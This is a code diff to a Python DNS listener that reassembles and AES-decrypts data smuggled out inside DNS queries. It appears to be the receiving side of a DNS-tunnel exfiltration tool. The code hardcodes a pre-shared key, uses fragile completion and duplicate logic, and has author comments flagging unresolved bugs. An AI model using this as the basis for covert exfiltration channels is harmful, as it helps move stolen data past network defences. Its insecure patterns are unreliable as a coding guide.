@@ -25,8 +25,6 @@ class SentPacketTypes(Enum):
 # Pre-shared key (PSK) for exchanging the AES key securely
 psk = b"thisisaverysecurekey123456789012"  # Must match the client's PSK
 
-# Initialize received_fragments as a dictionary to map IP addresses to their fragments
-received_fragments = {}
 
 class UnrelatedException(Exception):
     pass
@@ -48,6 +46,12 @@ class NXConnectionException(Exception):
 
 class PacketsOutOfOrderException(Exception):
     pass
+
+# Initialize received_fragments as a dictionary to map IP addresses to their fragments
+received_fragments = {}
+
+# Initialize received_fragments as a dictionary to map IP addresses to their messages
+received_messages = {}
 
 # AES decryption for the key exchange (PSK-based)
 def decrypt_with_psk(encrypted_data, psk, ip):
@@ -88,6 +92,7 @@ def decrypt_with_psk(encrypted_data, psk, ip):
         return None, False
 
 
+# TODO: IDK IF NEED CHECK PLS
 # Base64 decoding with padding
 def decode_base64_with_padding(data):
     missing_padding = len(data) % 4
@@ -96,16 +101,34 @@ def decode_base64_with_padding(data):
     return base64.b64decode(data)
 
 
-def decrypt_aes(data, key):
+def decrypt_aes(data, key, ip):
+    
+    global received_messages
+
+    # Initialize the fragment list for the IP if it doesn't exist
+    if ip not in received_messages:
+        received_messages[ip] = []
+
+    # Check if the data fragment is already received
+    if data in received_messages[ip]:
+        print(f"[SERVER] Duplicate messages from {ip}, ignoring.")
+        return None # Skip duplicate messages
+
+    # Append the new fragment to the list
+    received_messages[ip].append(data)
+    complete_message = "".join(received_messages[ip])
+
     try:
-        print(f"[SERVER] Encrypted data (base64) for decryption: {data}")
-        data = decode_base64_with_padding(data)  # Use the padding fix function
-        iv = data[:16]
-        encrypted_message = data[16:]
-        cipher = AES.new(key, AES.MODE_CBC, iv)
-        decrypted_data = unpad(cipher.decrypt(encrypted_message), AES.block_size)
-        print(f"[SERVER] Decrypted message: {decrypted_data.decode('utf-8')}")
-        return decrypted_data.decode('utf-8')
+        if complete_message.endswith("=") or complete_message.endswith("=="):
+            print(f"[SERVER] Encrypted data (base64) for decryption: {complete_message}")
+            data = decode_base64_with_padding(complete_message)  # Use the padding fix function
+            iv = data[:16]
+            encrypted_message = data[16:]
+            cipher = AES.new(key, AES.MODE_CBC, iv)
+            decrypted_data = unpad(cipher.decrypt(encrypted_message), AES.block_size)
+            print(f"[SERVER] Decrypted message: {decrypted_data.decode('utf-8')}")
+            received_messages[ip].clear()  # Clear the fragments after successful decryption
+            return decrypted_data.decode('utf-8')
     except Exception as e:
         print(f"[SERVER] Decryption error: {e}")
         return None
@@ -121,16 +144,17 @@ class DataParser:
     def get_length(self):
         return len(self.data)
 
-    def add(self, packet_number: int, data: bytes, key):
+    def add(self, packet_number: int, data: bytes, key, ip):
         if packet_number == self.last_received:
-            print("Repeated packet")
-            raise ShortCircuitException()  # Prevent duplicate processing
+            print(f"Repeated packet {packet_number}:{self.last_received}")
+            # raise ShortCircuitException()  # Prevent duplicate processing
         if not (packet_number > self.last_received or packet_number == 0):
             self.last_received = 0
             raise PacketsOutOfOrderException()  # Packets arrived out of order
         try:
-            decrypted_data = decrypt_aes(data.decode('ascii'), key)
-            self.data.extend(decrypted_data.encode('ascii'))  # Store decrypted data
+            decrypted_data = decrypt_aes(data.decode('ascii'), key, ip)
+            if decrypted_data != None:
+                self.data.extend(decrypted_data.encode('ascii'))  # Store decrypted data PROBLEMATIC IF DECRYPTED IS EMPTY
         except Exception as e:
             print(f"Unable to decode data packet: {e}")
         finally:
@@ -173,13 +197,16 @@ class DataParserManager:
 
             packet_number = int(packet_number)
             connection_id = int(connection_id)
+            
+            print(f"Packet Number: {packet_number}, Connection ID: {connection_id}, Hex Data: {hex_data}")
+
 
             if connection_id > len(self.parsers):
                 raise NXConnectionException()
 
             parser = self.parsers[connection_id - 1]
             aes_key = clients[parser.ip]['aes_key']  # Retrieve AES key for decryption
-            parser.add(packet_number, bytes.fromhex(hex_data), aes_key)
+            parser.add(packet_number, bytes.fromhex(hex_data), aes_key, ip)
             return (packet_number, connection_id - 1)
 
         except (ValueError, IndexError):
@@ -222,8 +249,8 @@ def handle_query(pkt, domain, data_parsers):
                 # Step 2: If AES key is already available, proceed with normal decryption
                 aes_key = clients[pkt[IP].src]['aes_key']
                 parser = clients[pkt[IP].src]['parser']
-                parser.add(0, data.encode('ascii'), aes_key)
-                print(f"[SERVER] Decrypted message for {pkt[IP].src}")
+                parser.add(0, data.encode('ascii'), aes_key, pkt[IP].src)
+                # print(f"[SERVER] Decrypted message for {pkt[IP].src}")
 
         else:
             print("[SERVER] No valid exfiltration data found.")
@@ -245,9 +272,8 @@ def get_data(full: str, domain: str):
 
     return data
 
-
+# Global variable to end thread
 stop_sniffing = threading.Event()
-
 
 # Starts a listener for DNS queries on port 53
 def start_listener(domain, data_parsers):
